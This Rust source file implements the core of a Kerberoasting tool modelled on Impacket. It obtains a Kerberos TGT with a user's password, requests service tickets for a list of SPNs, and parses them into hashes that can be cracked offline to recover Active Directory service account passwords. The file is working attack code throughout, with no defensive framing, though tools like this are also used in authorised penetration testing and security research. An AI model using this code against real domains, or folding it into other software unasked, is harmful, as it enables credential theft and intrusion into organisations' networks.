//! High-level Kerberoast client.
//! Follows Impacket's two-step AS-REQ flow:
//!   1. Probe AS-REQ (no pre-auth) → KDC returns PREAUTH_REQUIRED + ETYPE_INFO2
//!   2. Full AS-REQ with PA-ENC-TIMESTAMP using the etype/salt from ETYPE_INFO2
//!   3. TGS-REQ for each SPN

use rand::Rng;

use crate::error::KrbError;
use crate::kerberos::{
    as_req::{build_as_req_probe, build_as_req},
    as_rep::{parse_as_rep, try_parse_krb_error, parse_etype_info2, EtypeInfo2Entry},
    tgs_req::build_tgs_req,
    tgs_rep::{parse_tgs_rep, TgsHash},
    transport::KdcTransport,
    crypto::{ntlm_hash, aes_string_to_key},
};

// KDC error codes
const KDC_ERR_PREAUTH_REQUIRED: i64 = 25;
const KDC_ERR_ETYPE_NOSUPP:     i64 = 14;

pub struct KerberoastClient {
    dc_host:  String,
    kdc_port: u16,
    realm:    String,
    username: String,
    rc4_key:  Vec<u8>,
    password: String,
}

impl KerberoastClient {
    pub fn new(dc_host: &str, kdc_port: u16, realm: &str, username: &str, password: &str) -> Self {
        Self {
            dc_host:  dc_host.to_string(),
            kdc_port,
            realm:    realm.to_uppercase(),
            username: username.to_string(),
            rc4_key:  ntlm_hash(password),
            password: password.to_string(),
        }
    }

    /// Two-step TGT acquisition (matches Impacket's getKerberosTGT):
    ///  1. Send probe AS-REQ without pre-auth.
    ///  2. Parse KDC_ERR_PREAUTH_REQUIRED → extract ETYPE_INFO2 → choose etype + salt.
    ///  3. Send full AS-REQ with PA-ENC-TIMESTAMP.
    pub async fn get_tgt(&self) -> Result<(Vec<u8>, Vec<u8>, i64), KrbError> {
        // ── Step 1: probe ────────────────────────────────────────────────────
        let nonce1: u32 = rand::thread_rng().gen::<u32>() & 0x7FFF_FFFF;
        let probe   = build_as_req_probe(&self.username, &self.realm, nonce1);

        let mut t1   = KdcTransport::connect(&self.dc_host, self.kdc_port).await?;
        t1.send(&probe).await?;
        let resp1 = t1.recv().await?;

        // Parse the probe response to get ETYPE_INFO2
        let (etype, key) = match try_parse_krb_error(&resp1) {
            Some(err) if err.error_code == KDC_ERR_PREAUTH_REQUIRED => {
                eprintln!("[*] KDC requires pre-auth (expected). Parsing ETYPE_INFO2 ...");
                let entries = parse_etype_info2(&err.e_data);
                self.choose_etype_and_key(&entries)?
            }
            Some(err) if err.error_code == KDC_ERR_ETYPE_NOSUPP => {
                // Should not happen on probe (no real etype negotiation)
                return Err(KrbError::KrbErrorCode(err.error_code,
                    format!("KDC_ERR_ETYPE_NOSUPP on probe — {}", err.e_text)));
            }
            Some(err) => {
                return Err(KrbError::KrbErrorCode(err.error_code,
                    format!("{} — {}", crate::error::krb_error_string(err.error_code), err.e_text)));
            }
            None => {
                // No error → account has no pre-auth required, AS-REP already arrived
                eprintln!("[*] AS-REP received without pre-auth (no-preauth account).");
                // Try to parse as AS-REP with RC4 first (we have the password)
                eprintln!("[!] Cannot decrypt AS-REP without knowing etype — use RC4 key");
                let rep = parse_as_rep(&resp1, &self.rc4_key, 23)?;
                return Ok((rep.ticket_der, rep.session_key, rep.session_etype));
            }
        };

        eprintln!("[*] Using etype {} for AS-REQ.", etype);

        // ── Step 2: full AS-REQ with PA-ENC-TIMESTAMP ─────────────────────
        let nonce2: u32 = rand::thread_rng().gen::<u32>() & 0x7FFF_FFFF;
        let as_req = build_as_req(&self.username, &self.realm, &key, etype, nonce2)?;

        let mut t2   = KdcTransport::connect(&self.dc_host, self.kdc_port).await?;
        t2.send(&as_req).await?;
        let resp2 = t2.recv().await?;

        let rep = parse_as_rep(&resp2, &key, etype)?;
        Ok((rep.ticket_der, rep.session_key, rep.session_etype))
    }

    /// Pick the best etype from ETYPE_INFO2 and derive the corresponding key.
    /// Preference: AES256 (18) > AES128 (17) > RC4 (23).
    fn choose_etype_and_key(&self, entries: &[EtypeInfo2Entry]) -> Result<(i64, Vec<u8>), KrbError> {
        // Log what the KDC reported
        for e in entries {
            eprintln!("[*]   etype {} salt {:?}", e.etype,
                e.salt.as_deref().unwrap_or("<default>"));
        }

        // Build a preference list from what the KDC offers
        for preferred in &[18i64, 17, 23] {
            if let Some(entry) = entries.iter().find(|e| e.etype == *preferred) {
                let key = self.derive_key(entry.etype, entry.salt.as_deref())?;
                return Ok((entry.etype, key));
            }
        }

        // KDC sent no ETYPE_INFO2 entries — fall back to RC4
        if entries.is_empty() {
            eprintln!("[*] No ETYPE_INFO2 from KDC, falling back to RC4.");
            return Ok((23, self.rc4_key.clone()));
        }

        // Try whatever etype the KDC first offered
        let first = &entries[0];
        let key = self.derive_key(first.etype, first.salt.as_deref())?;
        Ok((first.etype, key))
    }

    fn derive_key(&self, etype: i64, salt_override: Option<&str>) -> Result<Vec<u8>, KrbError> {
        match etype {
            23 => Ok(self.rc4_key.clone()),
            17 | 18 => {
                // Default Kerberos salt: REALM || sAMAccountName (uppercase realm)
                let default_salt = format!("{}{}", self.realm, self.username);
                let salt = salt_override.unwrap_or(&default_salt);
                Ok(aes_string_to_key(&self.password, salt, etype))
            }
            e => Err(KrbError::UnsupportedEtype(e)),
        }
    }

    pub async fn request_tgs(
        &self,
        spn:          &str,
        tgt:          &[u8],
        session_key:  &[u8],
        session_etype: i64,
    ) -> Result<TgsHash, KrbError> {
        let nonce: u32 = rand::thread_rng().gen::<u32>() & 0x7FFF_FFFF;
        let tgs_req = build_tgs_req(spn, &self.realm, &self.username,
                                    tgt, session_key, session_etype, nonce)?;
        let mut t = KdcTransport::connect(&self.dc_host, self.kdc_port).await?;
        t.send(&tgs_req).await?;
        let resp = t.recv().await?;
        parse_tgs_rep(&resp, &self.username, &self.realm, spn)
    }

    pub async fn kerberoast(&self, spns: &[String]) -> Result<Vec<Result<TgsHash, KrbError>>, KrbError> {
        let (tgt, session_key, session_etype) = self.get_tgt().await?;
        eprintln!("[+] TGT obtained (session etype: {}).", session_etype);
        let mut results = Vec::new();
        for spn in spns {
            results.push(self.request_tgs(spn, &tgt, &session_key, session_etype).await);
        }
        Ok(results)
    }
}
